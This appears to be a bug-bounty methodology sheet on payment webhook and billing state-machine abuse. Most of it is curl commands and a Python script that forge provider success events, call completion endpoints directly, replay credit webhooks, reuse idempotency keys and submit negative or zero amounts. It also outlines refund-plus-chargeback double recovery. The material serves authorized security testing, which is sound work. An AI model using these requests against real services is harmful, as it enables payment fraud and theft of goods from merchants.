# Payment Webhook Attacks & Financial State-Machine Abuse

**Ceiling:** Free goods/services, subscription unlock, money movement, account credit duplication. P1 on any fintech/marketplace/SaaS with payment flows.

**Proof bar:** Before-state (unpaid/uncredited) → exploit step → after-state re-fetch shows fulfilled/credited. Screenshots of both states + the forged request = complete PoC. Balance screenshot alone insufficient — show the state BEFORE the exploit too.

---

## §1 — Payment Webhook Signature Bypass

### 1A — Signature NOT verified (the #1 class)

**How to test:**
```bash
# 1. Find the webhook endpoint (Burp history, JS source, /webhooks, /api/webhooks, /payment/callback)
# 2. Send a forged payment success event with garbage signature headers:

# Stripe-flavoured forgery:
curl -X POST https://target.com/webhooks/stripe \
  -H "Content-Type: application/json" \
  -H "Stripe-Signature: t=1234567890,v1=GARBAGE_VALUE" \
  -d '{
    "id": "evt_test_1234",
    "type": "payment_intent.succeeded",
    "data": {
      "object": {
        "id": "pi_test_1234",
        "amount": 9900,
        "currency": "usd",
        "status": "succeeded",
        "metadata": {
          "order_id": "YOUR_ORDER_ID",
          "user_id": "YOUR_USER_ID"
        }
      }
    }
  }'

# PayPal-flavoured forgery:
curl -X POST https://target.com/webhooks/paypal \
  -H "Content-Type: application/json" \
  -H "PAYPAL-TRANSMISSION-ID: fake-id" \
  -H "PAYPAL-TRANSMISSION-TIME: 2024-01-01T00:00:00Z" \
  -H "PAYPAL-CERT-URL: https://api.paypal.com/v1/notifications/certs/CERT-1234" \
  -H "PAYPAL-TRANSMISSION-SIG: GARBAGE" \
  -d '{"event_type":"PAYMENT.CAPTURE.COMPLETED","resource":{"id":"CAPTURE_ID","amount":{"value":"99.00","currency_code":"USD"}}}'

# Generic (no sig header at all):
curl -X POST https://target.com/payment/webhook \
  -H "Content-Type: application/json" \
  -d '{"event":"payment.success","order_id":"YOUR_ORDER_ID","status":"paid","amount":0}'
```

**Verification:** Check application state — is the order marked paid? Is the subscription active? Is the download unlocked? Re-fetch `/api/orders/YOUR_ORDER_ID` or `/api/subscription` and show `status: "active"` in response.

### 1B — Signature verified but coverage gap

```bash
# Valid signature covers only certain fields — modify uncovered fields
# Capture a REAL webhook from a $0.01 test payment → Burp

# Test 1: amount manipulation (sig covers event id, not amount)
# Use real signature from $0.01 payment, change amount to $99.00
# Send with original (valid) signature → if accepted → amount not in sig scope

# Test 2: event-id replay (replay a previously processed "payment.succeeded")
# Most payment providers include event IDs to prevent replay — test if server enforces uniqueness
# Send the SAME event_id twice → second should fail but may not

# Test 3: timestamp window widening
# Stripe rejects signatures older than 5 minutes — test if the window is enforced
# Replay a real webhook with a valid signature but old timestamp
# Try: t=0 (epoch), t=99999999999 (future)

# Test 4: test-mode event accepted in production
# Stripe test-mode events have "livemode": false
# Replace "livemode": true → false in a real webhook and check if still accepted
# Also: use test-mode Stripe API keys (sk_test_...) if found in JS — generate "real" events
```

### 1C — Test-mode / sandbox keys in production

```bash
# Check JS bundles for Stripe test keys: sk_test_ or pk_test_
# If sk_test_ found in production app:
pip install stripe
python3 - <<'EOF'
import stripe
stripe.api_key = "sk_test_FOUND_KEY"
# Create a payment intent in test mode
intent = stripe.PaymentIntent.create(amount=9900, currency="usd", metadata={"order_id": "TARGET_ORDER"})
# Confirm it with a test card
stripe.PaymentIntent.confirm(intent.id, payment_method="pm_card_visa")
# Then send the webhook event for this intent to the production webhook endpoint
# If accepted → test events accepted in production
print(intent.id)
EOF
```

---

## §2 — Direct Payment Completion Callback (No Provider Involvement)

**How it works:** App trusts the browser round-trip — after payment, the browser is redirected to `/payment/complete?status=success&order_id=X`. The server re-checks payment status via URL param or request body instead of re-verifying with the payment provider.

**Target endpoints:**
```
/payment/complete
/checkout/return
/checkout/success
/billing/callback
/order/confirm
/subscription/activate
/payment/success
/api/orders/complete
```

**Test:**
```bash
# 1. Create an order/subscription but DON'T pay
# 2. Note the order_id / checkout_session_id
# 3. Hit the completion endpoint directly with status=success / paid=true:

curl "https://target.com/payment/complete?order_id=YOUR_ORDER&status=success&transaction_id=fake_txn"
curl "https://target.com/checkout/return?session_id=YOUR_SESSION&payment_status=paid"

# POST variant:
curl -X POST https://target.com/api/orders/YOUR_ORDER_ID/complete \
  -H "Authorization: Bearer YOUR_SESSION_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status":"paid","transaction_id":"fake123","amount":0,"currency":"usd"}'

# Amount / currency manipulation:
-d '{"amount":0,"currency":"usd","status":"succeeded"}'
-d '{"amount":1,"plan":"enterprise","billing_cycle":"annual"}'
```

**Verification:** Re-fetch the order/subscription status: `GET /api/orders/YOUR_ORDER_ID` → check `"status": "paid"` or `"active"`. Screenshot before (unpaid) + curl command + screenshot after (paid/active) = complete PoC.

---

## §3 — Idempotency-Key & Replay Abuse

### 3A — Idempotency key reuse

```bash
# Idempotency keys are supposed to prevent duplicate charges/credits
# Test: reuse the SAME key on a DIFFERENT order

# Step 1: Make a successful payment with idempotency key K
curl -X POST https://target.com/api/payments \
  -H "Idempotency-Key: FIXED_KEY_1234" \
  -d '{"amount":100,"order_id":"ORDER_A"}'
# → order A charged, key K associated with this payment

# Step 2: Use the SAME key for a NEW order
curl -X POST https://target.com/api/payments \
  -H "Idempotency-Key: FIXED_KEY_1234" \
  -d '{"amount":9900,"order_id":"ORDER_B"}'
# Vulnerable: server returns the cached response from ORDER_A
# → ORDER_B is now considered paid without a real charge
# → OR the charge for ORDER_A is applied to ORDER_B (undercharge)

# Test: use ANOTHER USER's idempotency key (BOLA variant)
# Test: omit the key entirely — does the server reject, or process regardless?
```

### 3B — Webhook event replay for credit-granting events

```bash
# Capture a real webhook for a credit top-up / cashback / loyalty event in Burp
# Replay the SAME webhook body + headers multiple times:

for i in {1..5}; do
  curl -X POST https://target.com/webhooks/payment \
    -H "Content-Type: application/json" \
    -H "Stripe-Signature: ORIGINAL_VALID_SIG" \
    -d 'ORIGINAL_WEBHOOK_BODY'
  sleep 1
done
# Check credit balance after each replay
# If credits double each time → event-id uniqueness not enforced
```

**Verification:** Account credit/balance increases with each replay request. Screenshot of balance before + each replay + final balance = PoC.

---

## §4 — Refund / Chargeback State-Machine Abuse

### 4A — Refund without consumption check

```bash
# Test: refund an order for a digital good that you've already consumed
# 1. Buy a digital item (API key, subscription, download)
# 2. Use the item (activate the subscription, download the file, use the API key)
# 3. Request a refund via the normal refund API
# 4. Check: is the digital item/subscription still active after the refund?

curl -X POST https://target.com/api/orders/ORDER_ID/refund \
  -H "Authorization: Bearer SESSION_TOKEN" \
  -d '{"reason":"not_as_described"}'

# Then check subscription/item state:
curl https://target.com/api/subscription \
  -H "Authorization: Bearer SESSION_TOKEN"
# Vulnerable: "status": "active" even after refund processed
```

### 4B — Double recovery (refund + chargeback)

```bash
# 1. Purchase, get refund via the app's API
# 2. Also initiate a chargeback with the card issuer
# 3. Check if the app's system treats both as separate events
# → Both succeed → double recovery
# This requires a real card and real chargeback — document the capability
# at the code/logic level (no enforcement) rather than executing the chargeback
```

### 4C — Upgrade→refund→keep-plan

```bash
# 1. Upgrade from free to paid plan
# 2. Access premium features
# 3. Request refund / cancel immediately
# 4. Check: premium features still accessible?

# Test proration manipulation:
# Upgrade to annual → immediately downgrade → expect full refund? 
# Check what the app actually refunds vs. what it should
```

### 4D — Negative-amount / currency confusion

```bash
# Some payment APIs accept negative amounts (refund via charge endpoint):
curl -X POST https://target.com/api/payments \
  -H "Authorization: Bearer SESSION_TOKEN" \
  -d '{"amount":-9900,"currency":"usd","order_id":"NEW_ORDER"}'

# Currency confusion — pay in a low-value currency, receive in a high-value currency:
# e.g., pay $1 USD but manipulate currency field to EUR if FX conversion is off
-d '{"amount":100,"currency":"IDR","plan":"enterprise_usd"}'

# Zero-amount payment:
-d '{"amount":0,"currency":"usd","plan":"enterprise"}'
```

**Verification for all §4 classes:** Screenshot before-state (unpaid/refunded) + exploit request + after-state showing entitlement still active or double credit. Financial impact must be quantifiable ($ amount or access level).

---

## Webhook Discovery Checklist

```bash
# Find webhook endpoints (source: JS recon + Burp history):
grep -r "webhook\|/callback\|/ipn\|/notify\|/payment\|stripe\|paypal\|braintree\|paddle\|lemonsqueezy" \
  js_files/ --include="*.js" -l

# Common paths to probe:
/webhooks/stripe       /webhooks/paypal      /webhooks/braintree
/api/webhooks          /api/payment/callback  /api/billing/webhook
/payment/notify        /checkout/callback    /ipn                   
/billing/callback      /subscription/webhook /order/complete

# Check for test/debug endpoints:
/webhooks/test         /payment/test_callback /debug/payment
```
